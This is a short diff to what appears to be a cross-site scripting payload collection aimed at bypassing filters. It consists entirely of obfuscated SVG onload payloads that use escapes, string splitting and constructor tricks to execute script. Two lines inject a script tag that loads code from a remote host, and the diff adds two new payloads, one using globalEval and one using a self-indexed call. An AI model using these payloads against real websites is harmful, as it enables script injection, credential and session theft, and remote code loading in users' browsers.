@@ -58,9 +58,11 @@ on<>mouseover="ale<>rt()">
 <svg/onload=s=\u0063reateElement('scr'%2b'ipt');\u0062ody.\u0061ppendChild(s);s.src='http://x'.concat('x.xx/','eeW'); >
 <svg/onload=Set.constructor('al'%2b'ert(1)')()>
 <svg/onload=Set.constructor(appendChild(createElement('script')).src='http://xx.xx/eeW')()>
-
 <svg/onload=Set.constructor`al\x65rt\x28/xss/\x29```>
 <svg/onload=Map.constructor`al\x65rt\x28/xss/\x29```>
 <svg/onload=clear.constructor`al\x65rt\x28/xss/\x29```>
 <svg/onload=Array.constructor`al\x65rt\x28/xss/\x29```>
 <svg/onload=WeakSet.constructor`al\x65rt\x28/xss/\x29```>
+« <svg onload\r\n=$.globalEval("al"+"ert()");> »
+« <svg/onload=self[`aler`%2b`t`]`1`> »
+
